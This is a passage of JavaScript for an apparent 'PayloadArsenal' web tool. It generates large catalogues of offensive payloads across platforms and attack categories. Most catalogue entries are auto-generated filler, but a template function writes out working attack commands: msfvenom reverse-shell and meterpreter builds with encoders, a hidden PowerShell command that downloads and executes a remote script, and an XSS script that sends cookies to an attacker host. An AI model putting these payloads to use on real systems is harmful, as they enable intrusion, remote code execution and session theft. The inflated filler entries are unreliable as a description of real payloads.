            webshell: this.generatePayloadSet('mobile_webshell', 'Mobile WebShells', 40),
            persistence: this.generatePayloadSet('mobile_persistence', 'Mobile Persistence', 70),
            evasion: this.generatePayloadSet('mobile_evasion', 'Mobile Evasion', 60),
            lateral: this.generatePayloadSet('mobile_lateral', 'Mobile Lateral Movement', 35),
            steganography: this.generatePayloadSet('mobile_stego', 'Mobile Steganography', 25),
            crypto: this.generatePayloadSet('mobile_crypto', 'Mobile Cryptographic', 40)
        };
    }

    initAPIPayloads() {
        return {
            shellcode: this.generatePayloadSet('api_shellcode', 'API Shellcode', 50),
            powershell: this.generatePayloadSet('api_powershell', 'API PowerShell', 40),
            executable: this.generatePayloadSet('api_executable', 'API Executables', 30),
            script: this.generatePayloadSet('api_exploit', 'API Exploits', 80),
            webshell: this.generatePayloadSet('api_webshell', 'API WebShells', 60),
            persistence: this.generatePayloadSet('api_persistence', 'API Persistence', 45),
            evasion: this.generatePayloadSet('api_evasion', 'API Evasion', 35),
            lateral: this.generatePayloadSet('api_lateral', 'API Lateral Movement', 25),
            steganography: this.generatePayloadSet('api_stego', 'API Steganography', 20),
            crypto: this.generatePayloadSet('api_crypto', 'API Cryptographic', 30)
        };
    }

    initEmbeddedPayloads() {
        return {
            shellcode: this.generatePayloadSet('embedded_shellcode', 'Embedded Shellcode', 40),
            powershell: this.generatePayloadSet('embedded_powershell', 'Embedded PowerShell', 20),
            executable: this.generatePayloadSet('embedded_executable', 'Embedded Executables', 50),
            script: this.generatePayloadSet('embedded_exploit', 'Embedded Exploits', 60),
            webshell: this.generatePayloadSet('embedded_webshell', 'Embedded WebShells', 25),
            persistence: this.generatePayloadSet('embedded_persistence', 'Embedded Persistence', 35),
            evasion: this.generatePayloadSet('embedded_evasion', 'Embedded Evasion', 30),
            lateral: this.generatePayloadSet('embedded_lateral', 'Embedded Lateral Movement', 20),
            steganography: this.generatePayloadSet('embedded_stego', 'Embedded Steganography', 15),
            crypto: this.generatePayloadSet('embedded_crypto', 'Embedded Cryptographic', 25)
        };
    }

    initContainerPayloads() {
        return {
            shellcode: this.generatePayloadSet('container_shellcode', 'Container Shellcode', 45),
            script: this.generatePayloadSet('container_exploit', 'Container Exploits', 90),
            powershell: this.generatePayloadSet('container_powershell', 'Container PowerShell', 30),
            executable: this.generatePayloadSet('container_executable', 'Container Executables', 25),
            webshell: this.generatePayloadSet('container_webshell', 'Container WebShells', 20),
            persistence: this.generatePayloadSet('container_persistence', 'Container Persistence', 35),
            evasion: this.generatePayloadSet('container_evasion', 'Container Evasion', 40),
            lateral: this.generatePayloadSet('container_lateral', 'Container Lateral', 25),
            steganography: this.generatePayloadSet('container_stego', 'Container Steganography', 15),
            crypto: this.generatePayloadSet('container_crypto', 'Container Cryptographic', 20)
        };
    }

    initCloudPayloads() {
        return {
            shellcode: this.generatePayloadSet('cloud_shellcode', 'Cloud Shellcode', 60),
            powershell: this.generatePayloadSet('cloud_powershell', 'Cloud PowerShell', 80),
            executable: this.generatePayloadSet('cloud_executable', 'Cloud Executables', 50),
            script: this.generatePayloadSet('cloud_exploit', 'Cloud Exploits', 100),
            webshell: this.generatePayloadSet('cloud_webshell', 'Cloud WebShells', 70),
            persistence: this.generatePayloadSet('cloud_persistence', 'Cloud Persistence', 90),
            evasion: this.generatePayloadSet('cloud_evasion', 'Cloud Evasion', 75),
            lateral: this.generatePayloadSet('cloud_lateral', 'Cloud Lateral Movement', 55),
            steganography: this.generatePayloadSet('cloud_stego', 'Cloud Steganography', 30),
            crypto: this.generatePayloadSet('cloud_crypto', 'Cloud Cryptographic', 45)
        };
    }

    initIoTPayloads() {
        return {
            shellcode: this.generatePayloadSet('iot_shellcode', 'IoT Shellcode', 50),
            powershell: this.generatePayloadSet('iot_powershell', 'IoT PowerShell', 25),
            executable: this.generatePayloadSet('iot_executable', 'IoT Executables', 60),
            script: this.generatePayloadSet('iot_exploit', 'IoT Exploits', 80),
            webshell: this.generatePayloadSet('iot_webshell', 'IoT WebShells', 40),
            persistence: this.generatePayloadSet('iot_persistence', 'IoT Persistence', 55),
            evasion: this.generatePayloadSet('iot_evasion', 'IoT Evasion', 45),
            lateral: this.generatePayloadSet('iot_lateral', 'IoT Lateral Movement', 35),
            steganography: this.generatePayloadSet('iot_stego', 'IoT Steganography', 20),
            crypto: this.generatePayloadSet('iot_crypto', 'IoT Cryptographic', 30)
        };
    }

    initBlockchainPayloads() {
        return {
            shellcode: this.generatePayloadSet('blockchain_shellcode', 'Blockchain Shellcode', 25),
            powershell: this.generatePayloadSet('blockchain_powershell', 'Blockchain PowerShell', 20),
            executable: this.generatePayloadSet('blockchain_executable', 'Blockchain Executables', 30),
            script: this.generatePayloadSet('blockchain_exploit', 'Blockchain Exploits', 40),
            webshell: this.generatePayloadSet('blockchain_webshell', 'Blockchain WebShells', 35),
            persistence: this.generatePayloadSet('blockchain_persistence', 'Blockchain Persistence', 25),
            evasion: this.generatePayloadSet('blockchain_evasion', 'Blockchain Evasion', 20),
            lateral: this.generatePayloadSet('blockchain_lateral', 'Blockchain Lateral Movement', 15),
            steganography: this.generatePayloadSet('blockchain_stego', 'Blockchain Steganography', 10),
            crypto: this.generatePayloadSet('blockchain_crypto', 'Blockchain Cryptographic', 45)
        };
    }

    initAIMLPayloads() {
        return {
            shellcode: this.generatePayloadSet('aiml_shellcode', 'AI/ML Shellcode', 30),
            powershell: this.generatePayloadSet('aiml_powershell', 'AI/ML PowerShell', 25),
            executable: this.generatePayloadSet('aiml_executable', 'AI/ML Executables', 35),
            script: this.generatePayloadSet('aiml_exploit', 'AI/ML Exploits', 50),
            webshell: this.generatePayloadSet('aiml_webshell', 'AI/ML WebShells', 40),
            persistence: this.generatePayloadSet('aiml_persistence', 'AI/ML Persistence', 30),
            evasion: this.generatePayloadSet('aiml_evasion', 'AI/ML Evasion', 25),
            lateral: this.generatePayloadSet('aiml_lateral', 'AI/ML Lateral Movement', 20),
            steganography: this.generatePayloadSet('aiml_stego', 'AI/ML Steganography', 15),
            crypto: this.generatePayloadSet('aiml_crypto', 'AI/ML Cryptographic', 35)
        };
    }

    initExploitsPayloads() {
        return {
            shellcode: this.generatePayloadSet('exploit_shellcode', 'Exploit Shellcode', 200),
            powershell: this.generatePayloadSet('exploit_powershell', 'Exploit PowerShell', 180),
            executable: this.generatePayloadSet('exploit_executable', 'Exploit Executables', 220),
            script: this.generatePayloadSet('generic_exploit', 'Generic Exploits', 300),
            webshell: this.generatePayloadSet('exploit_webshell', 'Exploit WebShells', 150),
            persistence: this.generatePayloadSet('exploit_persistence', 'Exploit Persistence', 170),
            evasion: this.generatePayloadSet('exploit_evasion', 'Exploit Evasion', 190),
            lateral: this.generatePayloadSet('exploit_lateral', 'Exploit Lateral Movement', 140),
            steganography: this.generatePayloadSet('exploit_stego', 'Exploit Steganography', 80),
            crypto: this.generatePayloadSet('exploit_crypto', 'Exploit Cryptographic', 120)
        };
    }

    initKernelPayloads() {
        return {
            shellcode: this.generatePayloadSet('kernel_shellcode', 'Kernel Shellcode', 80),
            powershell: this.generatePayloadSet('kernel_powershell', 'Kernel PowerShell', 40),
            executable: this.generatePayloadSet('kernel_executable', 'Kernel Executables', 90),
            script: this.generatePayloadSet('kernel_exploit', 'Kernel Exploits', 100),
            webshell: this.generatePayloadSet('kernel_webshell', 'Kernel WebShells', 30),
            persistence: this.generatePayloadSet('kernel_persistence', 'Kernel Persistence', 70),
            evasion: this.generatePayloadSet('kernel_evasion', 'Kernel Evasion', 85),
            lateral: this.generatePayloadSet('kernel_lateral', 'Kernel Lateral Movement', 50),
            steganography: this.generatePayloadSet('kernel_stego', 'Kernel Steganography', 25),
            crypto: this.generatePayloadSet('kernel_crypto', 'Kernel Cryptographic', 45)
        };
    }

    initNetworkPayloads() {
        return {
            shellcode: this.generatePayloadSet('network_shellcode', 'Network Shellcode', 100),
            powershell: this.generatePayloadSet('network_powershell', 'Network PowerShell', 80),
            executable: this.generatePayloadSet('network_executable', 'Network Executables', 90),
            script: this.generatePayloadSet('network_exploit', 'Network Exploits', 150),
            webshell: this.generatePayloadSet('network_webshell', 'Network WebShells', 70),
            persistence: this.generatePayloadSet('network_persistence', 'Network Persistence', 85),
            evasion: this.generatePayloadSet('network_evasion', 'Network Evasion', 95),
            lateral: this.generatePayloadSet('network_lateral', 'Network Lateral Movement', 120),
            steganography: this.generatePayloadSet('network_stego', 'Network Steganography', 40),
            crypto: this.generatePayloadSet('network_crypto', 'Network Cryptographic', 60)
        };
    }

    initSocialEngPayloads() {
        return {
            shellcode: this.generatePayloadSet('social_shellcode', 'Social Engineering Shellcode', 60),
            powershell: this.generatePayloadSet('social_powershell', 'Social Engineering PowerShell', 80),
            executable: this.generatePayloadSet('social_executable', 'Social Engineering Executables', 100),
            script: this.generatePayloadSet('social_exploit', 'Social Engineering', 120),
            webshell: this.generatePayloadSet('social_webshell', 'Social Engineering WebShells', 70),
            persistence: this.generatePayloadSet('social_persistence', 'Social Engineering Persistence', 50),
            evasion: this.generatePayloadSet('social_evasion', 'Social Engineering Evasion', 65),
            lateral: this.generatePayloadSet('social_lateral', 'Social Engineering Lateral Movement', 40),
            steganography: this.generatePayloadSet('social_stego', 'Social Engineering Steganography', 55),
            crypto: this.generatePayloadSet('social_crypto', 'Social Engineering Cryptographic', 35)
        };
    }

    initPhysicalPayloads() {
        return {
            shellcode: this.generatePayloadSet('physical_shellcode', 'Physical Attack Shellcode', 40),
            powershell: this.generatePayloadSet('physical_powershell', 'Physical Attack PowerShell', 35),
            executable: this.generatePayloadSet('physical_executable', 'Physical Attack Executables', 50),
            script: this.generatePayloadSet('physical_exploit', 'Physical Attacks', 70),
            webshell: this.generatePayloadSet('physical_webshell', 'Physical Attack WebShells', 25),
            persistence: this.generatePayloadSet('physical_persistence', 'Physical Attack Persistence', 45),
            evasion: this.generatePayloadSet('physical_evasion', 'Physical Attack Evasion', 40),
            lateral: this.generatePayloadSet('physical_lateral', 'Physical Attack Lateral Movement', 30),
            steganography: this.generatePayloadSet('physical_stego', 'Physical Attack Steganography', 35),
            crypto: this.generatePayloadSet('physical_crypto', 'Physical Attack Cryptographic', 20)
        };
    }

    initMITREPayloads() {
        return {
            shellcode: this.generatePayloadSet('mitre_shellcode', 'MITRE Shellcode', 120),
            powershell: this.generatePayloadSet('mitre_powershell', 'MITRE PowerShell', 150),
            executable: this.generatePayloadSet('mitre_executable', 'MITRE Executables', 100),
            script: this.generatePayloadSet('mitre_technique', 'MITRE Techniques', 200),
            webshell: this.generatePayloadSet('mitre_webshell', 'MITRE WebShells', 80),
            persistence: this.generatePayloadSet('mitre_persistence', 'MITRE Persistence', 110),
            evasion: this.generatePayloadSet('mitre_evasion', 'MITRE Evasion', 130),
            lateral: this.generatePayloadSet('mitre_lateral', 'MITRE Lateral Movement', 90),
            steganography: this.generatePayloadSet('mitre_stego', 'MITRE Steganography', 50),
            crypto: this.generatePayloadSet('mitre_crypto', 'MITRE Cryptographic', 70)
        };
    }

    generatePayloadSet(prefix, category, count) {
        const payloads = [];
        const techniques = ['T1001', 'T1003', 'T1055', 'T1059', 'T1068', 'T1070', 'T1190', 'T1204'];
        const riskLevels = ['low', 'medium', 'high'];

        for (let i = 1; i <= count; i++) {
            payloads.push({
                id: `${prefix}_${i}`,
                name: `${category} Payload ${i}`,
                description: `Advanced ${category.toLowerCase()} payload with evasion capabilities and custom implementation.`,
                template: this.generateTemplate(prefix, i),
                techniques: [techniques[Math.floor(Math.random() * techniques.length)]],
                riskFactors: [riskLevels[Math.floor(Math.random() * riskLevels.length)]],
                category: category,
                version: `v${Math.floor(i / 10) + 1}.${i % 10}`
            });
        }

        return payloads;
    }

    generateTemplate(prefix, index) {
        const templates = {
            windows_shellcode: `msfvenom -p windows/shell/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f raw -e x86/shikata_ga_nai -i ${index % 5 + 1}`,
            windows_powershell: `powershell -NoP -NonI -W Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://{TARGET_IP}:{TARGET_PORT}/payload${index}.ps1')"`,
            windows_executable: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f exe -e x86/shikata_ga_nai -i ${index % 3 + 1} -x calc.exe -k`,
            linux_shellcode: `msfvenom -p linux/x64/shell/reverse_tcp LHOST={TARGET_IP} LPORT={TARGET_PORT} -f elf -e x64/xor -i ${index % 3 + 1}`,
            web_exploit: `<script>fetch('http://{TARGET_IP}:{TARGET_PORT}/exfil?data='+btoa(document.cookie+document.location.href))</script>`,
            api_exploit: `curl -X POST {TARGET_IP}:{TARGET_PORT}/api/v${index}/exploit -H "Content-Type: application/json" -d '{"payload":"${btoa('exploit')}"}'`
        };

        const baseTemplate = templates[prefix] || `# ${prefix} payload ${index}\n# Target: {TARGET_IP}:{TARGET_PORT}\n# Advanced payload implementation`;

        return baseTemplate;
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    window.payloadArsenal = new PayloadArsenal();
});

// Handle visibility changes for better UX
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible' && window.payloadArsenal) {
        window.payloadArsenal.updateProgress(Math.random() * 100);
    }
});

// Handle online/offline status
window.addEventListener('online', () => {
    if (window.payloadArsenal) {
        window.payloadArsenal.showToast('Connection restored', 'success');
    }
});

window.addEventListener('offline', () => {
    if (window.payloadArsenal) {
        window.payloadArsenal.showToast('Working offline', 'warning');
    }
});

// Save preferences before unload
window.addEventListener('beforeunload', () => {
    if (window.payloadArsenal) {
        window.payloadArsenal.saveUserPreferences();
    }
});
